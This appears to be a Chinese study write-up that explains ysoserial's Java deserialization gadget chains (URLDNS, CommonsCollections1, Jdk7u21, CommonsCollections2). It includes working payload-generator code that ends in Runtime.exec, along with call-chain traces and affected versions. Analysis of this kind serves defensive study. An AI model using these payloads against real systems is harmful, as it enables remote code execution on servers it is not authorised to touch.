<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 0x01.生成 payload</span></span><br><span class="line">        <span class="comment">// 设置一个 hashMap</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 设置可以接收 DNS 查询的地址</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://analysis&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 将 URL 的 hashCode 字段设置为允许修改</span></span><br><span class="line">        Field f = Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 1. 设置 url 的 hashCode 字段为 0xdeadbeef（随意的值）</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>);  <span class="comment">// 默认为 -1 会触发 DNS 查询，因此修改后 hashMap.put 中就不触发</span></span><br><span class="line">        <span class="comment">// 2. 将 url 放入 hashMap 中，右边参数随便写</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;http://analysis&quot;</span>);</span><br><span class="line">        <span class="comment">// 修改 url 的 hashCode 字段为 -1，触发 DNS 查询</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 0x02.写入文件模拟网络传输</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 0x03.读取文件，进行反序列化触发 payload</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ysoserial.payloads.URLDNS 使用 URL 类对象和 url 值作为 HashMap 对象的 key-value</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">        <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">        URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">        HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">        URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">        ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ysoserial.payloads.URLDNS.SilentURLStreamHandler 避免在生成 payload 时触发 DNS 查询，返回为空</p>
<ul>
<li>规避 DNSLOG</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><blockquote>
<p>利用 ChainedTransformer 构造恶意调用链<br>放在特性和 TransformedMap 相同的 lazyMap 中<br>通过动态代理 AnnotationInvocationHandler 的反序列化触发</p>
</blockquote>
<p>适用版本</p>
<ul>
<li>commons-collections 3.1 ~ 3.2.1</li>
<li>jdk1.8 之前</li>
</ul>
<p>利用链：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">		AnnotationInvocationHandler.readObject()</span><br><span class="line">			Map(Proxy).entrySet()</span><br><span class="line">				AnnotationInvocationHandler.invoke()</span><br><span class="line">					LazyMap.get()</span><br><span class="line">						ChainedTransformer.transform()</span><br><span class="line">							ConstantTransformer.transform()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Class.getMethod()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Runtime.getRuntime()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Runtime.exec()</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/09/16/O45lTtijsKYwng6.jpg" >

<p>ysoserial.payloads.CommonsCollections1 构造 <code>ChainedTransformer</code>（RCE 指令），然后封装到 lazyMap 中。动态代理 AnnotationInvocationHandler 反序列化时会对成员变量 <code>memberValues</code> （代理对象）调用 <code>entrySet</code> 方法，即调用对应 handler 的 invoke 方法，因此用 lazyMap 构造代理。然后会调用 lazyMap 的 handler，也即调用赋值给其 <code>factory</code> 方法的 ChainedTransformer，实现 RCE。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	<span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line">	<span class="comment">// inert chain for setup</span></span><br><span class="line">	<span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">		<span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// real chain for after setup</span></span><br><span class="line">	<span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">			<span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">			<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">				String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">				<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">			<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">				Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">				<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">			<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">				<span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">			<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 创建 lazyMap 对象</span></span><br><span class="line">	<span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="comment">// transformerChain 赋值给 lazyMap 的 factory 变量</span></span><br><span class="line">	<span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 动态代理</span></span><br><span class="line">	<span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 将 Map 传入 InvocationHandler 成员变量 memberValues</span></span><br><span class="line">	<span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 利用反射赋值</span></span><br><span class="line">	Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line">	<span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="jdk-1-7u21"><a href="#jdk-1-7u21" class="headerlink" title="jdk 1.7u21"></a>jdk 1.7u21</h2><blockquote>
<p>涉及哈希碰撞和 TemplatesImpl<br>TemplatesImpl 承载恶意调用链，可作为其他 gadget 的“后半”部分</p>
</blockquote>
<p>不依赖第三方库，JDK 本身实现的反序列化操作存在安全漏洞。</p>
<p>fix：AnnotationInvocationHandler 的 <code>readObject</code> 方法增加了异常抛出，之前是直接 return。</p>
<ul>
<li>HashMap 构造的 AnnotationInvocationHandler 和 TemplatesImpl 可以存储在 LinkedHashSet 中，在反序列化时通过哈希碰撞（<code>hashCode(f5a5a608)=0</code>）执行下一步；</li>
<li>在代理对象上调用 <code>equals()</code>，即调用 AnnotationInvocationHandler 的 <code>equalsImpl()</code>，它会 invoke TemplatesImpl 的所有非零参方法，包括 <code>getOutputProperties()</code>；</li>
<li>上面的步骤会使用 TemplatesImpl 中序列化的恶意字节数组 <code>_bytecodes</code> 作为参数，调用 <code>ClassLoader.declareClass()</code>，最终实现任意代码执行。</li>
</ul>
<p>反序列化对象图</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet</span><br><span class="line">     |  |</span><br><span class="line">     |  &#96;--&gt; Proxy (Templates) </span><br><span class="line">     |         |</span><br><span class="line">     |         &#96;--&gt; AnnotationInvocationHandler </span><br><span class="line">     |                      |</span><br><span class="line">     |                      &#96;--&gt; HashMap</span><br><span class="line">     |                            |  |</span><br><span class="line">     |                            |  &#96;----&gt; String (&quot;f5a5a608&quot;)</span><br><span class="line">     |                            |</span><br><span class="line">     &#96;-----&gt; TemplatesImpl &lt;------&#96;</span><br><span class="line">                  |</span><br><span class="line">                  &#96;-------&gt; byte[] (malicious class definition)</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/09/16/oXL5farBdAERI1F.jpg" >

<p>利用链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet.readObject()</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      TemplatesImpl.hashCode() (X)</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      Proxy(Templates).hashCode() (X)</span><br><span class="line">        AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">          AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">            String.hashCode() (0)</span><br><span class="line">            AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">              TemplatesImpl.hashCode() (X)</span><br><span class="line">      Proxy(Templates).equals()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">          AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">            Method.invoke()</span><br><span class="line">              ...</span><br><span class="line">                TemplatesImpl.getOutputProperties()</span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                      TemplatesImpl.defineTransletClasses()</span><br><span class="line">                        ClassLoader.defineClass()</span><br><span class="line">                        Class.newInstance()</span><br><span class="line">                          ...</span><br><span class="line">                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                              ...</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>ysoserial.payloads.Jdk7u21</p>
<p>LinkedHashSet （继承 HashMap 实现）调用 <code>writeObject()</code> 方法序列化时，会依次调用每个元素的 <code>writeObject()</code> ，反序列化时会依次调用每个元素的 <code>readObject()</code> 方法，然后将其作为 key 放入 HashMap 中。</p>
<p>HashMap 中添加元素会调用已有元素的 key 作为参数，调用插入元素的 <code>equals()</code> 方法进行比较。因此只要让反序列化时先添加代理对象，再添加恶意代码实例即可。</p>
<p>普通对象调用 <code>hashCode()</code> 比较，代理对象 AnnotationInvocationHandler 通过 invoke 调用 <code>hashCode</code> ，内部调用 <code>hashCodeImpl()</code>，而其对 memberValues 循环调用 <code>memberValueHashCode()</code>，当其中的对象不是数组时，返回 <code>hashCode</code>。</p>
<p>为了让 AnnotationInvocationHandler 代理的对象的返回值与普通对象的返回值相等，这就要求 memberValues  中只有一个值，因此只放一个 key 为 <code>f5a5a608</code>，value 为包含恶意代码的 templates 。</p>
<ul>
<li>这里是为了能够执行 equals 然后触发 <code>TemplatesImpl.getOutputProperties</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 恶意代码</span></span><br><span class="line">	<span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 哈希碰撞值</span></span><br><span class="line">	String zeroHashCodeStr = <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 构造 HashMap</span></span><br><span class="line">	HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">	map.put(zeroHashCodeStr, <span class="string">&quot;foo&quot;</span>); <span class="comment">// value 任意值，让 LinkedHashSet.add 成功</span></span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 使用 HashMap 创建 AnnotationInvocationHandler</span></span><br><span class="line">	InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">    <span class="comment">// 设置为 Templates 类型</span></span><br><span class="line">	Reflections.setFieldValue(tempHandler, <span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line">    <span class="comment">// 使用 AnnotationInvocationHandler 创建 Templates 代理接口</span></span><br><span class="line">	Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 继承 HashSet</span></span><br><span class="line">	LinkedHashSet set = <span class="keyword">new</span> LinkedHashSet(); <span class="comment">// maintain order</span></span><br><span class="line">	set.add(templates);</span><br><span class="line">	set.add(proxy); <span class="comment">// 进行一次比较，如果一开始放的 templates 无法添加 proxy</span></span><br><span class="line"></span><br><span class="line">	Reflections.setFieldValue(templates, <span class="string">&quot;_auxClasses&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">	Reflections.setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 放入实际的 value（替换）</span></span><br><span class="line">	map.put(zeroHashCodeStr, templates); <span class="comment">// swap in real object</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> set;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ysoserial.payloads.util.Gadgets 使用 javaassist 库创建包含恶意代码的类，恶意代码可以在无参构造函数或 static block 中，将恶意代码添加到 TemplatesImpl 的 <code>_bytecodes</code> 变量中，等反序列化时调用 <code>getOutputProperties()</code> 或 <code>newTransformer()</code> 触发恶意代码执行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( Boolean.parseBoolean(System.getProperty(<span class="string">&quot;properXalan&quot;</span>, <span class="string">&quot;false&quot;</span>)) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> createTemplatesImpl(</span><br><span class="line">            command,</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>),</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;</span>),</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> T templates = tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use template gadget class</span></span><br><span class="line">    ClassPool pool = ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload.class));</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line">    <span class="keyword">final</span> CtClass clazz = pool.get(StubTransletPayload.class.getName());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// run command in static initializer</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line">    String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">        command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">        <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd); <span class="comment">// 创建 static block</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">    clazz.setName(<span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());</span><br><span class="line">    CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">   clazz.setSuperclass(superC);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 获取字节码</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject class bytes into instance</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">        classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置进入 defineTransletClasses() 的条件</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>); <span class="comment">// 必须填充</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance()); <span class="comment">// 可选</span></span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><blockquote>
<p> 利用 TemplatesImpl 承载恶意调用链<br> PriorityQueue 在反序列化时比较元素（恢复顺序），而比较操作可以自定义<br> 利用 InvokerTransformer 构造比较操作，在比较时触发 transform 操作，进一步触发 TemplatesImpl</p>
</blockquote>
<p>适用版本</p>
<ul>
<li>commons-collections 4.0<ul>
<li>CommonsCollections1 可以在该版本复现，改为 <code>Map lazyMap = LazyMap.lazyMap(innerMap,transformerChain);</code> 设置 factory</li>
</ul>
</li>
<li>jdk7u21<ul>
<li>使用 TemplatesImpl 的变量 <code>_bytecodes</code> 承载恶意字节码</li>
</ul>
</li>
</ul>
<p>利用链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">		PriorityQueue.readObject()</span><br><span class="line">			...</span><br><span class="line">				TransformingComparator.compare()</span><br><span class="line">					InvokerTransformer.transform()</span><br><span class="line">						Method.invoke()</span><br><span class="line">							Runtime.exec()</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/09/16/rP7TSdGYfbiRmD2.png" >

<p>ysoserial.payloads.CommonsCollections2 创建 PriorityQueue 对象，并将其 comparator 设置为包含恶意 transformer 对象的 TransformingComparator。</p>
<p>PriorityQueue 反序列化时最后会调用 <code>heapify -&gt; siftDown</code>（将无序队列还原为优先队列）， 当 comparator 不为空时进一步调用 <code>siftDownUsingComparator -&gt; conparator.compare</code>  最终通过调用 <code> transformer.transform(TemplatesImpl)</code>实现 RCE。</p>
<ul>
<li><code>PriorityQueue.heapify()</code> 用于构造二叉堆</li>
<li><code>InvokerTransformer.transform(TemplatesImpl) -&gt; TemplatesImpl.newTransformer()</code></li>
</ul>
<p>TemplatesImpl 类主要的作用为：</p>
<ul>
<li>使用 <code>_bytecodes</code> 成员变量存储恶意字节码 ( 恶意 class -&gt; byte array )</li>
<li>提供加载恶意字节码并触发执行的函数，加载在 <code>defineTransletClasses()</code> 方法中，方法触发为 <code>getOutputProperties()</code> 或 <code>newTransformer()</code></li>
</ul>
